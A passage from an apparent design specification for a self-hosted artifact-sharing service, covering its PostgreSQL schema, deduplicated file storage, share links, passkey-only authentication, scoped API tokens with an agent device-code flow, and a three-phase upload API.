    sha256          bytea NOT NULL REFERENCES file(sha256),
    size            bigint NOT NULL,
    content_type    text NOT NULL,
    PRIMARY KEY (version_id, path)
);
CREATE INDEX ON version_file (sha256);

CREATE TABLE file (
    sha256          bytea PRIMARY KEY,
    size            bigint NOT NULL,
    ref_count       integer NOT NULL DEFAULT 0,
    has_brotli      boolean NOT NULL DEFAULT false,
    has_gzip        boolean NOT NULL DEFAULT false,
    created_at      timestamptz NOT NULL DEFAULT now(),
    last_ref_at     timestamptz NOT NULL DEFAULT now()
);
CREATE INDEX ON file (last_ref_at) WHERE ref_count = 0;

CREATE TABLE artifact_tag (
    artifact_id     text NOT NULL REFERENCES artifact(id) ON DELETE CASCADE,
    tag             citext NOT NULL,
    PRIMARY KEY (artifact_id, tag),
    CONSTRAINT tag_format CHECK (tag ~ '^[a-z0-9][a-z0-9 _-]{0,39}$')
);
CREATE INDEX ON artifact_tag (tag);

CREATE TYPE upload_state AS ENUM ('open', 'committing', 'committed', 'expired', 'aborted');

CREATE TABLE upload_session (
    id              text PRIMARY KEY,
    artifact_id     text NOT NULL REFERENCES artifact(id) ON DELETE CASCADE,
    version_id      text NOT NULL REFERENCES artifact_version(id) ON DELETE CASCADE,
    user_id         text NOT NULL REFERENCES app_user(id) ON DELETE CASCADE,
    state           upload_state NOT NULL DEFAULT 'open',
    manifest        jsonb NOT NULL,
    pending_count   integer NOT NULL,
    created_by_token text REFERENCES api_token(id),
    created_at      timestamptz NOT NULL DEFAULT now(),
    expires_at      timestamptz NOT NULL,    -- created_at + 4h (video is in scope)
    committed_at    timestamptz
);
CREATE INDEX ON upload_session (state, expires_at) WHERE state = 'open';
```

**`kind` is derived, not inferred from content.** It is set at commit from the manifest's
shape: more than one file → `bundle`; one file whose type is HTML → `page`; PDF or office
document → `document`; image, video → those; anything else → `file`. It drives which viewer
chrome the dashboard shows (§11) and nothing else. No file is opened to determine it.

## 3.5 File storage

```
/var/lib/share/
├── files/
│   └── ab/cd/abcdef…9f          # sha256 hex, sharded 2/2
│       ├── (the bytes, 0640, share:share-read)
│       ├── abcdef…9f.br         # optional
│       └── abcdef…9f.gz         # optional
├── tmp/                         # uploads land here; same filesystem, atomic rename
├── quarantine/                  # hash mismatches, kept 24 h
└── backups/                     # nightly staging
```

Write protocol: stream to `tmp/{random}.part` hashing incrementally and enforcing
`SHARE_MAX_FILE_BYTES`; compare the digest to the one in the URL; on mismatch move to
`quarantine/` and return `400 file_hash_mismatch`; `fsync`; `rename()` into place (atomic
within a filesystem, so a reader never sees a partial file); `fsync` the directory;
`INSERT … ON CONFLICT (sha256) DO UPDATE SET last_ref_at = now()`.

**Precompression.** After a successful write, if the content type is compressible (§6.6) and
the size is 1 KB–10 MB, the worker queues brotli (q9) and gzip (l6) siblings for Caddy's
`precompressed`. Outside that window, files are served as stored; Caddy does not compress on
the fly, which would defeat `sendfile`. Video and images are never precompressed.

**Deduplication is instance-wide.** Two users posting the same file share one blob. The
`skipped` count returned by the post API is computed **only against files already referenced by
the calling user**, so it can never be used to test whether anyone else on the instance holds a
given file (§5.4.1).

**Range requests.** Caddy's `file_server` handles `Range` natively, which is what makes video
seeking work. Nothing in the API needs to participate; the authorisation call happens first and
the byte serving happens after.

## 3.6 Reference counting and collection

`file.ref_count` moves with `version_file` rows, transactionally. It is advisory — the
authoritative check at sweep time is a `NOT EXISTS`, so a drifted counter can never delete live
data.

Nightly at 04:00:

```sql
SELECT sha256 FROM file f
WHERE f.ref_count <= 0
  AND f.last_ref_at < now() - interval '24 hours'
  AND NOT EXISTS (SELECT 1 FROM version_file vf WHERE vf.sha256 = f.sha256)
LIMIT 5000
FOR UPDATE SKIP LOCKED;
```

For each: delete the blob and its `.br`/`.gz` siblings, delete the row, prune empty shard
directories. Bounded at 5,000 per run, logged with a summary. The 24-hour grace window plus the
row lock make it impossible to collect a file an in-flight upload session is about to reference.

Hard deletion cascade: trashed artifacts are hard-deleted after `SHARE_TRASH_DAYS`, which
removes `version_file` rows, which drops ref counts, which makes files collectable on the
following run. An artifact trashed today has its unique bytes gone in 31 days. The
`DELETE /api/v1/artifacts/{name}?purge=true` path skips the trash window entirely and is
audited — that is the path P8 is tested against.

## 3.7 Sharing tables

```sql
CREATE TABLE share_link (
    id              text PRIMARY KEY,
    artifact_id     text NOT NULL REFERENCES artifact(id) ON DELETE CASCADE,
    token_hash      bytea NOT NULL UNIQUE,   -- sha256 of the 128-bit token
    display_prefix  text NOT NULL,           -- first 8 chars, so the UI can name it
    label           text,                    -- "Fairfield team", operator's note
    password_hash   text,                    -- argon2id; NULL = no password
    expires_at      timestamptz NOT NULL,    -- NEVER NULL (P4)
    max_views       integer,                 -- optional burn-after-N viewer-days
    view_count      integer NOT NULL DEFAULT 0,   -- authorised responses; display only
    viewer_days     integer NOT NULL DEFAULT 0,   -- exact count of distinct (day, viewer-hash)
                                                  -- pairs; this drives max_views, never the HLL
    last_viewed_at  timestamptz,
    created_by_user text REFERENCES app_user(id),
    created_by_token text REFERENCES api_token(id),
    created_at      timestamptz NOT NULL DEFAULT now(),
    revoked_at      timestamptz,
    CONSTRAINT expiry_required CHECK (expires_at IS NOT NULL)
);
CREATE INDEX ON share_link (artifact_id) WHERE revoked_at IS NULL;
CREATE INDEX ON share_link (expires_at) WHERE revoked_at IS NULL;

CREATE TABLE share_grant (
    id              text PRIMARY KEY,
    artifact_id     text NOT NULL REFERENCES artifact(id) ON DELETE CASCADE,
    user_id         text NOT NULL REFERENCES app_user(id) ON DELETE CASCADE,
    note            text,
    created_by      text NOT NULL REFERENCES app_user(id),
    created_at      timestamptz NOT NULL DEFAULT now(),
    revoked_at      timestamptz,
    UNIQUE (artifact_id, user_id)
);
CREATE INDEX ON share_grant (user_id) WHERE revoked_at IS NULL;

CREATE TABLE recipient_session (
    id              text PRIMARY KEY,
    share_link_id   text NOT NULL REFERENCES share_link(id) ON DELETE CASCADE,
    token_hash      bytea NOT NULL UNIQUE,
    ip_hash         bytea,                   -- salted daily hash, never the address (P6)
    created_at      timestamptz NOT NULL DEFAULT now(),
    expires_at      timestamptz NOT NULL,
    revoked_at      timestamptz
);
CREATE INDEX ON recipient_session (share_link_id) WHERE revoked_at IS NULL;
```

Two distinct mechanisms, deliberately not merged:

- A **share link** is a bearer capability for anyone, account or not.
- A **share grant** points an artifact at another *user* of this instance, which is what puts it
  in their "shared with me". It needs no token and cannot leak by forwarding.

A recipient session never outlives its share link: revoking the link, changing its password, or
trashing the artifact deletes the sessions immediately (P9).

## 3.8 Audit and views

```sql
CREATE TABLE audit_event (
    id              text PRIMARY KEY,        -- ULID: chronological
    user_id         text REFERENCES app_user(id) ON DELETE SET NULL,
    actor_type      text NOT NULL,           -- 'user' | 'token' | 'recipient' | 'system'
    actor_token_id  text REFERENCES api_token(id),
    action          text NOT NULL,           -- §10.7
    target_type     text,
    target_id       text,
    target_label    text,                    -- denormalised; survives deletion
    ip              inet,
    user_agent      text,
    metadata        jsonb NOT NULL DEFAULT '{}'::jsonb,
    created_at      timestamptz NOT NULL DEFAULT now()
);
CREATE INDEX ON audit_event (user_id, created_at DESC);
CREATE INDEX ON audit_event (action, created_at DESC);
CREATE INDEX ON audit_event (target_id);
```

The application database role holds `INSERT, SELECT` on this table and nothing else, so no code
path can rewrite history. Retention is indefinite; the table stays small.

```sql
CREATE TABLE view_daily (
    artifact_id     text NOT NULL REFERENCES artifact(id) ON DELETE CASCADE,
    day             date NOT NULL,
    source          text NOT NULL,           -- 'owner' | 'grant' | 'link'
    share_link_id   text REFERENCES share_link(id) ON DELETE SET NULL,
    views           integer NOT NULL DEFAULT 0,
    viewers         integer NOT NULL DEFAULT 0,
    bytes_served    bigint NOT NULL DEFAULT 0,
    PRIMARY KEY (artifact_id, day, source, share_link_id)
);
```

There is no raw view table. Events buffer in Redis for 60 seconds and aggregate straight into
daily rows, with a `HyperLogLog` per (artifact, day, source) for the distinct-viewer estimate.
The HLL is an **estimate and is never used for enforcement** — `share_link.viewer_days` is an
exact counter maintained by a Redis set of the day's viewer hashes per link, which is what
`max_views` burns against.
Nothing per-request is ever written to disk, which makes P6 true by construction rather than by
a retention policy — there is no raw data to expire.

## 3.9 Denormalised counters

`app_user.storage_bytes` and `artifact_count` are maintained by trigger into a Redis dirty-set
that the worker drains every 60 seconds, not by application code that can forget. A user is
charged for every file their artifacts reference, even one another user also references; this
over-counts globally and is the intended simple behaviour. `sharectl recompute-quota` rebuilds
from scratch.

## 3.10 Redis keyspace

Nothing durable lives here. A flush costs at most 60 seconds of view counts and resets rate
limits.

| Key | Type | TTL | Purpose |
| --- | --- | --- | --- |
| `sh:res:{space}:{name}` | hash | 60 s | Resolved artifact + live version |
| `sh:man:{versionId}` | hash | 600 s | path → file |
| `sh:tok:{sha256}` | string | 300 s | Share-link validity |
| `sh:sess:{sha256}` | string | 300 s | Session validity |
| `sh:wa:{challengeId}` | string | 300 s | WebAuthn challenge |
| `sh:rl:{bucket}:{subject}` | string | window | Rate limit buckets |
| `sh:up:{sessionId}` | hash | 4 h | Pending file set for an upload |
| `sh:views` | stream | — | View events awaiting flush |
| `sh:hll:{artifactId}:{day}:{source}` | HLL | 40 d | Distinct viewer estimate |
| `sh:dirty:users` | set | — | Users needing a storage recompute |

## 3.11 Bootstrap

`sharectl bootstrap --email you@c52.com --handle robert` creates the root user with
`is_root = true`, prints a passkey-registration URL valid for 15 minutes, and refuses to run if
any user already exists. Registration of the first passkey completes the bootstrap and prints
one recovery code and one API token.

---

# Part 4 — Identity: Passkeys, Sessions, Tokens, and Recovery

## 4.1 Three credentials, no passwords

| Credential | Held by | Used for | Form |
| --- | --- | --- | --- |
| **Passkey** | People | Signing in to the dashboard | WebAuthn, in 1Password or a platform authenticator |
| **API token** | Agents | Everything on the HTTP API and MCP endpoint | `shr_` + 43 chars base64url |
| **Recipient session** | Someone with a share link | Viewing one artifact | Cookie, scoped to that link's path |

**There is no user password anywhere in the system.** No storage, no strength rules, no
rotation, no reset-by-email flow. That last one is the point: a password reset is a path that
bypasses the password entirely, and it is where most real account takeovers happen. Deleting
the password deletes the reset flow with it.

Share-link passwords (§7.4) are a different thing — a shared secret protecting one link, not an
identity — and they are the only argon2 hashes in the system apart from recovery codes.

## 4.2 Passkey registration

WebAuthn, with `SHARE_HOST` as the Relying Party ID. Implementation uses a maintained library
(`webauthn` for Python); nothing here reimplements the cryptography.

```
POST /auth/passkey/register/begin      (session, or a valid invite/bootstrap token)
 ← 200 { publicKey: { challenge, rp, user, pubKeyCredParams,
                      authenticatorSelection: { residentKey: "preferred",
                                                userVerification: "preferred" },
                      excludeCredentials: [ …already-registered IDs… ],
                      attestation: "none", timeout: 120000 } }

POST /auth/passkey/register/finish     { credential: <attestation response>, name: "1Password" }
 ← 201 { id: "pky_…", name: "1Password", createdAt: "…" }
```

Decisions and why:

- **`attestation: "none"`.** Share does not care which authenticator model was used, and
  requesting attestation adds a verification burden and a privacy signal for no benefit on a
  single-operator instance.
- **`residentKey: "preferred"`.** Discoverable credentials give the usernameless sign-in flow —
  land on the sign-in screen, tap, done, no email typed. 1Password supports them.
- **`userVerification: "preferred"`, not `"required"`.** Required breaks security keys without
  a PIN and adds friction for a threat model where the device is already the operator's.
- **`excludeCredentials`** prevents registering the same authenticator twice, which otherwise
  produces confusing duplicate entries.
- Every credential gets a **name**, defaulted from the AAGUID against a known-authenticator list
  and editable. "Which of these three is my laptop" needs an answer before revoking one.

**Registering a second passkey is part of setup, not an optional extra.** The first-run
checklist (§12.3) does not complete until at least two are registered or the operator
explicitly dismisses it. Recovery is easy with two keys and unpleasant with one.

## 4.3 Sign-in

```
POST /auth/passkey/login/begin         { }            ← no email needed
 ← 200 { publicKey: { challenge, rpId, userVerification: "preferred",
                      allowCredentials: [] , timeout: 120000 } }

POST /auth/passkey/login/finish        { credential: <assertion response> }
 ← 200 { user: { id, email, handle, displayName, isRoot } }
   Set-Cookie: share_s=<token>; HttpOnly; Secure; SameSite=Lax; Path=/; Max-Age=2592000
```

`allowCredentials` is empty, so the browser offers whichever discoverable credential matches —
this is the one-tap path. Verification:

1. Look up `passkey_credential` by the returned credential ID. Unknown → `401 invalid_credential`.
2. Verify the signature against the stored COSE key, the challenge from Redis (single-use, then
   deleted), the origin, and the RP ID.
3. **Signature counter check.** If the stored `sign_count` is non-zero and the asserted count is
   not greater, treat it as a possible cloned authenticator: reject with
   `401 credential_counter_regressed`, revoke nothing automatically, write an audit event, and
   email the owner. Many authenticators (1Password included) always report zero, so the check
   only applies when the stored count is already non-zero.
4. Update `sign_count`, `last_used_at`.
5. Create the session.

Rate limits: 20 login-begin per IP per 10 minutes, 10 finish attempts per IP per 10 minutes.
Brute force is not a meaningful threat against a public-key signature, so these exist to stop
noise rather than to hold a line.

## 4.4 Sessions

| Property | Value |
| --- | --- |
| Cookie | `share_s`, `HttpOnly`, `Secure`, `SameSite=Lax`, `Path=/`, host-only |
| Lifetime | 30 days sliding, 90 days absolute |
| Extension | `expires_at` extends on any request more than an hour since the last extension |
| CSRF | Double-submit: readable `share_csrf` cookie plus `X-Share-CSRF` header on every unsafe method; mismatch is `403 csrf_failed` |
| Listing | `GET /api/v1/auth/sessions` — created, last seen, IP, coarse user agent, which passkey, current flag |
| Revocation | `DELETE /api/v1/auth/sessions/{id}`, or sign out everywhere (§11.19) |

Revoking a passkey revokes every session created with it. Disabling a user revokes all of
theirs.

## 4.5 Recovery

The one place passkeys are genuinely harder than passwords, handled in three layers.

**Layer 1 — more than one passkey.** 1Password syncs across the operator's devices; a second
platform passkey on another machine covers the vault being unavailable. This is the layer that
handles almost every real case, which is why §4.2 pushes it during setup.

**Layer 2 — a recovery code.** Generated at bootstrap and regenerable at any time. Twenty-four
characters, Crockford base32, shown once, hashed with argon2id.

```
POST /auth/recovery/use      { "email": "you@c52.com", "code": "…" }
 ← 200  a session, plus a forced prompt to register a new passkey before anything else
```

Rules: single use; using one invalidates all others and issues a fresh one; the session it
creates is limited to 30 minutes and can do exactly two things — register a passkey and list
existing ones; using a code emails the owner and writes an audit event; 5 attempts per email
per hour, 20 per IP per day.

**Layer 3 — the server.** It is the operator's machine, which no hosted service can offer:

```
sharectl grant-session --email you@c52.com --minutes 30
  → prints a one-time URL that establishes a session on first use
```

Requires root on the box. Audited as `auth.session_granted` with `actor_type='system'`. This is
the true backstop and it means the operator can never be permanently locked out of their own
files while they still have SSH.

**What deliberately does not exist:** email-link recovery. Adding it would reintroduce exactly
the bypass path that removing passwords eliminated.

## 4.6 API tokens

```
Authorization: Bearer shr_7Fq2mR8v…
```

Resolution, constant-time at every step: parse, `SELECT … WHERE token_hash = sha256(token)`,
reject unknown / revoked / expired / disabled-owner with an identical `401 invalid_token` and
identical timing — never distinguish "revoked" from "wrong". `last_used_at` and `last_used_ip`
are buffered in Redis and flushed every 60 seconds rather than written on the request path.

Because tokens are 256-bit random values, plain SHA-256 is the correct storage function;
argon2 exists to slow guessing of low-entropy secrets and would only add latency.

Resolved tokens cache at `sh:tok:{sha256hex}` for 30 seconds. **Revocation bypasses the cache**
with an immediate `DEL`.

### 4.6.1 Scopes

| Scope | Grants |
| --- | --- |
| `artifacts:read` | List, read metadata, download files, read versions, search |
| `artifacts:write` | Create, overwrite, rename, tag, set TTL, trash, restore |
| `artifacts:delete` | Purge from trash — permanent deletion, separate from `write` |
| `share:create` | Create, extend, and revoke share links; grant to other users |
| `account:read` | Read own profile, quota, tokens, sessions |
| `account:admin` | Create tokens, invite users, change settings |

Defaults:

- **Agent-issued tokens** (§4.6.2) get `artifacts:read`, `artifacts:write`. Nothing else.
- `share:create` is never granted automatically. An agent that can post cannot put anything on
  the public internet, which is what makes P3 meaningful.
- `artifacts:delete` is separate from `write` so that a looping agent's worst case is a full
  trash rather than an empty account.

Enforcement is a FastAPI dependency, `require(scope)`. A missing scope returns
`403 insufficient_scope` **naming the scope in the body**, so an agent can tell its human
exactly what to add rather than retrying.

### 4.6.2 How an agent gets a token

Two paths, both requiring a human at some point.

**Dashboard** (§11.18). The owner creates a named token, ticks scopes, copies it once. The
`share:create` checkbox carries its own warning line (§12.6).

**Device-code flow**, for an agent that wants to bootstrap itself:

```
POST /api/v1/auth/device/start   { "name": "claude-code@hosta" }
 ← 200 { deviceCode, userCode: "QRTZ-8H4M", verifyUrl: "https://share.c52.com/~/authorize",
         expiresIn: 600, interval: 5 }

  (the agent prints: "Open https://share.c52.com/~/authorize and enter QRTZ-8H4M")

POST /api/v1/auth/device/poll    { "deviceCode": "…" }
 ← 428 { "error": { "code": "authorization_pending" } }        … then, once approved:
 ← 200 { "token": "shr_…", "tokenId": "shr_01J…", "scopes": ["artifacts:read","artifacts:write"] }
```

The human signs in with their passkey, sees which agent and machine is asking, and approves —
scoped, always, to the agent default set. Elevating a token is a separate deliberate act in the
dashboard.

This replaces the email-code flow of the earlier draft. It is better here because the approval
happens in an authenticated session where the human can see what they are granting, rather than
by typing a code that arrived in an inbox.

## 4.7 Recipient sessions

Someone holding a share link is not a user and never becomes one.

- Cookie `share_r_{first 8 chars of the token}`, `Path=/s/{token}`, `HttpOnly`, `Secure`,
  `SameSite=Lax`. Path-scoped, so a recipient holding three links keeps three independent
  cookies and none is ever sent to another link.
- Value is `{recipientSessionId}.{HMAC-SHA256(secret_key, id)}`. The MAC is checked first
  (cheap, constant-time), then the row, cached 300 s.
- Lifetime: 24 hours, never beyond the share link's own expiry.
- **A recipient session authorises nothing but viewing that one artifact through that one
  link.** It is not accepted by `/api/v1/*`, `/~/*`, or `/mcp`. Tested by T-SEC-07.

## 4.8 Invites

Only the root user, or a user with `account:admin`, may invite.

```
POST /api/v1/invites    { "email": "sarah@…", "handle": "sarah" }
```

The invitee receives a link, opens it, registers a passkey, and lands in their own empty space.
No password is ever created because none exists. Acceptance creates the user and audits
`user.create`. Invite tokens live 7 days.

Handles are claimed at invite time so two pending invites cannot collide, and are subject to
the reserved list in §6.3.

## 4.9 Error taxonomy

| HTTP | Code | When |
| --- | --- | --- |
| 401 | `invalid_token` | Missing, malformed, unknown, revoked, or expired API token |
| 401 | `invalid_credential` | Unknown passkey credential ID |
| 401 | `credential_counter_regressed` | Possible cloned authenticator; owner emailed |
| 401 | `webauthn_verification_failed` | Signature, challenge, origin, or RP ID mismatch |
| 401 | `session_expired` | Dashboard cookie past expiry |
| 401 | `recipient_auth_required` | Share link needs its password |
| 401 | `recipient_auth_failed` | Wrong share-link password |
| 403 | `insufficient_scope` | Valid token, missing scope; body names it |
| 403 | `csrf_failed` | Unsafe dashboard request without a matching CSRF pair |
| 403 | `wrong_credential_class` | Recipient session or share token presented to the API |
| 410 | `invite_expired` | Invite past its TTL |
| 428 | `authorization_pending` | Device-code poll before approval |
| 429 | `rate_limited` | Any bucket in §10.2 |

Every authentication failure writes an audit event with source IP and, where parseable, the
token's `display_prefix`. Repeated failures trip the auth bucket and surface on the security
screen (§11.20).

## 4.10 Secret-handling rules

1. No secret is logged at any level. The logging filter redacts anything matching `shr_`,
   `Bearer `, or a cookie value.
2. Error responses never echo a submitted credential.
3. Tokens and recovery codes are displayed exactly once, at creation. `display_prefix` is
   stored so the UI and audit log can name a token without holding it.
4. `sharectl` refuses to print a full token when stdout is not a TTY unless `--force` is passed.
5. Backups contain hashes and public keys only. There is no secret in the database whose
   disclosure grants access — a stolen dump yields no usable credential, which is a direct
   consequence of having no passwords and no stored API secrets.

---

# Part 5 — Spaces, Ownership, and the Artifact API

## 5.1 API conventions

**Base URL.** `https://share.c52.com/api/v1`. One host, one API. The dashboard, the MCP
endpoint, and the CLI all call it.

**Content type.** `application/json; charset=utf-8`, except file uploads
(`application/octet-stream`) and the bundle endpoint (`application/x-tar` / `application/gzip`).

**Casing.** `camelCase` in JSON, `snake_case` in the database. Nothing leaks across.

**Timestamps.** RFC 3339 with `Z`. **Sizes.** Integer bytes, never formatted strings.

**Versioning.** `v1` in the path; additive changes ship without a bump. Responses carry
`X-Share-Api-Version: 1`.

### 5.1.1 Error envelope

Every non-2xx response is exactly this and nothing else:

```json
{
  "error": {
    "code": "artifact_not_found",
    "message": "No artifact named 'postcal' in your space.",
    "detail": { "name": "postcal" },
    "requestId": "req_01JAV…"
  }
}
```

`code` is stable and part of the contract — agents branch on it. `message` is one sentence,
safe to print to a terminal, and never contains a credential or a filesystem path. For
validation failures, `detail` is
`{"fields":[{"path":"files[3].sha256","code":"invalid_hash","message":"…"}]}`. Every response,
success or failure, carries `X-Share-Request-Id`.

### 5.1.2 Pagination

Cursor-based, using the ULID primary key. `?limit=50&cursor=art_01JAV…&order=desc`, returning
`{ items, nextCursor, hasMore }`. `limit` defaults to 50, maximum 200. Offsets are not
supported anywhere.

### 5.1.3 Idempotency

Any creating `POST` accepts `Idempotency-Key` (≤255 chars), scoped to `(user, endpoint, key)`
and cached in Redis for 24 hours with the full serialised response. A replay returns the
original status and body plus `X-Share-Idempotent-Replay: true`; a replay with a different body
is `409 idempotency_key_reused`.

### 5.1.4 Request limits

| Limit | Value |
| --- | --- |
| JSON body | 10 MB |
| File upload body | `SHARE_MAX_FILE_BYTES`, default 5 GB |
| Bundle upload | 200 MB compressed / 800 MB expanded |
| URL length | 8 KB |
| Upload timeout | 3600 s (video) |
| Everything else | 30 s |

## 5.2 Spaces are hard boundaries

Every artifact belongs to exactly one user's space. There is **no API by which any principal
writes into a space it does not own** — no `userId` parameter on any write, no admin override,
no impersonation. The owning user is always derived from the credential, never from the
request.

This is the property that makes multi-user safe without a permission system: a compromised
token can damage exactly one space, and reading across spaces requires an explicit share
(§7.7).

Reading follows the same rule with one addition: a principal may read an artifact in another
space if and only if a live `share_grant` names them, or they hold a live share link.

## 5.3 Naming artifacts

Names are the address. They are chosen, not generated.

- Pattern: `^[a-z0-9][a-z0-9._-]*(/[a-z0-9][a-z0-9._-]*)*$`, at most 200 characters, at most 8
  segments. Slashes are allowed so `q3/market-report` works.
- Lowercase only. A submitted name is lowercased before validation, so `PostCal` becomes
  `postcal` rather than being rejected — agents are inconsistent about case and this is not
  worth an error.
- Unique per space among non-deleted artifacts. Trashed artifacts hold their name (§8.4), so a
  name is not reusable until the trash is emptied or the artifact is purged.
- Reserved names, per §6.3, are rejected with `422 name_reserved`.
- A name may not end in `/` and may not contain `..`, `//`, or a segment that is only dots.

Because names may contain slashes, every API path segment carrying a `{name}` is
**percent-encoded** by the client — `q3/market-report` becomes `q3%2Fmarket-report` in
`/api/v1/artifacts/q3%2Fmarket-report/links`. The server decodes exactly once and rejects any
residual `%` (§6.4 rule 1). Artifact **URLs** are unaffected: `/q3/market-report` is a real
path, not an encoded one.

**If no name is supplied**, the server generates `{adjective}-{noun}-{4 chars}` from curated
word lists — readable, typeable, and not a random hex string. Generated names are for scratch
output; anything the agent intends you to return to should be named.

**Renaming** (`PATCH`, §5.9) moves the address. The old name 404s immediately and is not
aliased. Share links are unaffected — they address the artifact, not the name (§7.2), which is
exactly why a link handed to a client survives a rename.

## 5.4 Posting an artifact — three phases

Designed so unchanged files are never re-sent, a partial upload never goes live, and a crashed
agent can resume.

### Phase 1 — declare

```
POST /api/v1/artifacts
Authorization: Bearer shr_…
Idempotency-Key: 0f1c…
```

```json
{
  "name": "postcal",
  "title": "Q4 posting calendar",
  "entryPath": "index.html",
  "tags": ["social", "grokbot"],
  "ttl": null,
  "note": "regenerated with November slots",
  "files": [
    { "path": "index.html",     "size": 18422, "contentType": "text/html", "sha256": "9f2a…" },
    { "path": "style.css",      "size": 4110,  "contentType": "text/css",  "sha256": "1b70…" },
    { "path": "img/chart.png",  "size": 90211, "contentType": "image/png", "sha256": "cc31…" }
  ]
}
```

| Field | Required | Notes |
| --- | --- | --- |
| `files` | yes | 1–`SHARE_MAX_FILES_PER_VERSION` |
| `files[].path` | yes | Normalised per §6.4 |
| `files[].size` | yes | Must match the uploaded body exactly |
| `files[].sha256` | yes | Lowercase hex, 64 chars |
| `files[].contentType` | no | Defaults from the extension map (§6.6); explicit wins |
| `name` | no | Absent → generated. Present and existing in this space → a new version of it |
| `title`, `description` | no | Explicit metadata only; never inferred |
| `entryPath` | no | Which file to serve at the artifact root. Defaults per §5.5 |
| `tags` | no | Up to 20 |
| `ttl` | no | Duration string (`30d`) or `null`. Artifacts do not expire unless asked |
| `note` | no | Version note, ≤500 chars |
| `allowFraming` | no | Default `false` → `X-Frame-Options: SAMEORIGIN`. Ignored with a warning on artifacts reached through a password-protected link (§6.6.6) |
| `csp` | no | A `Content-Security-Policy` string served verbatim with this artifact's HTML. Share imposes no default (§6.6.6) |

**Response `201`:**

```json
{
  "artifactId": "art_01JAV…",
  "name": "postcal",
  "versionId": "ver_01JAV…",
  "seq": 2,
  "uploadSessionId": "ups_01JAV…",
  "expiresAt": "2026-08-24T22:04:00Z",
  "totalFiles": 3,
  "skipped": 2,
  "uploads": [
    { "path": "img/chart.png", "sha256": "cc31…", "method": "PUT",
      "url": "https://share.c52.com/api/v1/files/cc31…?sid=ups_01JAV…&exp=1756070000&sig=…" }
  ],
  "warnings": []
}
```

`uploads` is deduplicated by hash — the same file at three paths uploads once.

Every entry in a `warnings` array has the shape `{code, message, detail?}`, and warning codes
are part of the API contract with the same stability as error codes — an agent may branch on
them. The full catalogue is §12.6.

#### 5.4.1 The dedupe oracle

`skipped` counts only files already referenced by an artifact **belonging to the calling user**.
A file held solely by another user is re-uploaded and silently deduplicated on write, costing
nothing. Without this rule, `skipped` would answer "does anyone on this instance hold these
exact bytes", which is a real leak on a multi-user instance and free to close.

### Phase 2 — upload

```
PUT /api/v1/files/{sha256}?sid={uploadSessionId}&exp={unix}&sig={hmac}
Content-Type: application/octet-stream
Content-Length: 90211
```

- The URL is signed with `secret_key` over `sha256 | sid | exp`, valid for the session's
  lifetime. Tampered or expired → `403 upload_signature_invalid`.
- **No `Authorization` header is needed** — the signature is the credential, so an agent can
  hand URLs to a parallel uploader without sharing its token.
- Digest mismatch → `400 file_hash_mismatch`, body quarantined, the pending set unchanged so a
  retry works. Size mismatch → `400 file_size_mismatch`.
- A file the server already holds returns `200` immediately without reading the body; clients
  must tolerate a response arriving before they finish sending.
- Up to 16 concurrent uploads per session; beyond that, `429 too_many_uploads` with
  `Retry-After`. Recommended agent concurrency is 4 for large files, 8 for small.

Response: `{ "sha256": "cc31…", "size": 90211, "remaining": 0 }` — so a client knows it is
ready to commit without polling.

**Resuming.** `GET /api/v1/uploads/{uploadSessionId}` returns the session with freshly signed
URLs for whatever is still pending.

### Phase 3 — commit

```
POST /api/v1/artifacts/{name}/versions/{versionId}/commit
```

The `seq` shown at declare time is provisional. It is **assigned at commit** under a row lock
on the artifact, so two agents declaring concurrently cannot collide on
`UNIQUE (artifact_id, seq)`.

In one transaction: verify every declared hash exists and every size matches
(`409 files_missing` / `409 file_size_mismatch`, nothing mutated); check quota
(`413 quota_exceeded` with `currentBytes`, `projectedBytes`, `quotaBytes`); `COPY` the
`version_file` rows and increment reference counts; derive `kind` from the manifest shape;
resolve `entry_path` per §5.5; set the artifact's `live_version_id`; mark the session
committed; write `artifact.post` to the audit log.

After commit, outside the transaction: invalidate the resolution cache, queue precompression,
mark the user dirty for a storage recompute.

**Response `200`:**

```json
{
  "artifactId": "art_01JAV…",
  "name": "postcal",
  "url": "https://share.c52.com/postcal",
  "seq": 2,
  "kind": "bundle",
  "entryPath": "/index.html",
  "fileCount": 3,
  "totalBytes": 112743,
  "visibility": "private",
  "shareLinks": 0,
  "warnings": []
}
```

`visibility` is always `private` on a fresh post. Posting never creates a share link — that is
a separate call with a separate scope.

The pointer flip is the only moment the artifact changes. There is no window where half a
version is live, and a viewer mid-request against the old version keeps being served from
immutable files.

## 5.5 Entry path resolution

For a bundle, something has to answer at the artifact root. In order:

1. An explicit `entryPath` in the request, if it exists in the manifest. If it was supplied but
   is not in the manifest, resolution falls through to the next rule and an
   `entry_path_not_found` warning is returned — a post is never failed over a cosmetic field.
   On `PATCH`, where there is no manifest to fall back through, the same condition is
   `422 invalid_entry_path`.
2. `/index.html`.
3. If exactly one file is HTML, that file.
4. If exactly one file exists at all, that file.
5. Otherwise none — the artifact root renders the file-listing page (§6.5) and a
   `no_entry_point` warning is returned.

A single-file artifact always gets its own file as the entry path, so `share.c52.com/report`
renders `report.pdf` directly rather than a listing with one row.

## 5.6 One-shot bundle upload

Three round trips is two too many for small things.

```
POST /api/v1/artifacts/bundle?name=postcal&title=…&entryPath=index.html
Content-Type: application/x-tar          (or application/gzip)
```

- ≤200 MB compressed, ≤800 MB expanded, ≤5,000 entries.
- Symlinks, hardlinks, device nodes, and traversing or absolute paths are rejected outright
  with `422 invalid_archive`.
- Expansion ratio over 100:1 → `422 archive_ratio_exceeded`.
- Returns the same body as commit.

The CLI and MCP server choose this path automatically under 25 MB and 200 files, and the
three-phase path above it, where deduplication starts to pay. Overridable with
`--bundle` / `--no-bundle`.

## 5.7 Abandoned sessions

Every 15 minutes the worker marks `open` sessions past `expires_at` as `expired` and deletes
the draft version row — no `version_file` rows exist, so no reference counts move. Uploaded
files become unreferenced and are collected after the 24-hour grace window.

Committing an expired session returns `409 upload_session_expired`. Re-declaring is cheap: all
the files are already on the server, so the new session's `uploads` array will be empty.

## 5.8 Reading

```
GET /api/v1/artifacts?limit=50&cursor=…&q=calendar&tag=social&kind=bundle&order=updated_desc
GET /api/v1/artifacts?shared=true            → shared with me (§7.7)
GET /api/v1/artifacts?trashed=true           → the trash
GET /api/v1/artifacts/{name}
GET /api/v1/artifacts/{name}/files?version=…
GET /api/v1/artifacts/{name}/files/content?path=/index.html&version=…
```

Item shape:

```json
{
  "id": "art_01JAV…", "name": "postcal", "title": "Q4 posting calendar",
  "kind": "bundle", "url": "https://share.c52.com/postcal",
  "owner": { "handle": "robert", "isSelf": true },
  "visibility": "shared",           // 'private' | 'shared' | 'granted'
